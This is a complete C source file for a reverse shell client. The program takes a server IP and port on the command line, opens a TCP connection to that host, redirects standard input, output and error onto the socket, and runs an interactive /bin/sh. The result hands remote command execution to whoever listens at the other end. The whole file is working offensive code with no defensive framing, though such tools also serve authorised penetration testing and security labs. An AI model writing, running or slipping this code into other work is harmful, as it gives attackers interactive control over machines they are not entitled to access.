#include <arpa/inet.h>
#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include "common.h"

static void usage(const char *progname) {
  RSH_LOG("%s\nusage: %s -s <server_ip> -p <server_port>\n", BANNER, progname);
}

static int parse_args(int argc, char *argv[], struct in_addr *addr,
                      in_port_t *server_port) {
  int opt;

  while ((opt = getopt(argc, argv, "p:s:h")) != -1) {
    switch (opt) {
    case 'p':
      *server_port = htons(atoi(optarg));
      break;

    case 's':
      inet_aton(optarg, addr);
      break;

    case 'h':
      return 1;
    }
  }

  if (!(*server_port) || !addr->s_addr) {
    return 1;
  }

  return 0;
}

static void exec_shell(int fd) {
  char *const cmd[3] = { "/bin/sh", "-i", NULL };

  dup2(fd, STDIN_FILENO);
  dup2(fd, STDOUT_FILENO);
  dup2(fd, STDERR_FILENO);

  execv(cmd[0], cmd);
}

static int run(struct sockaddr_in *addr) {
  int fd;

  addr->sin_family = AF_INET;

  if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
    RSH_ERROR("fail to create the communication socket!\n");
    return 1;
  }

  RSH_INFO("trying to connect to server...\n");

  if (connect(fd, (struct sockaddr *)addr, sizeof(struct sockaddr))) {
    RSH_ERROR("fail to connect to server!\n");
    close(fd);

    return 1;
  }

  RSH_INFO("connection estabilished!\n");

  exec_shell(fd);

  return 0;  // normally never reached
}

int main(int argc, char *argv[]) {
  struct sockaddr_in addr;
  int ret;

  memset(&addr, 0, sizeof(struct sockaddr_in));

  // parse the server ip and port
  if (parse_args(argc, argv, &addr.sin_addr, &addr.sin_port)) {
    usage(argv[0]);
    exit(EXIT_FAILURE);
  }

  // run the client
  ret = run(&addr);

  exit(!ret ? EXIT_SUCCESS : EXIT_FAILURE);
}
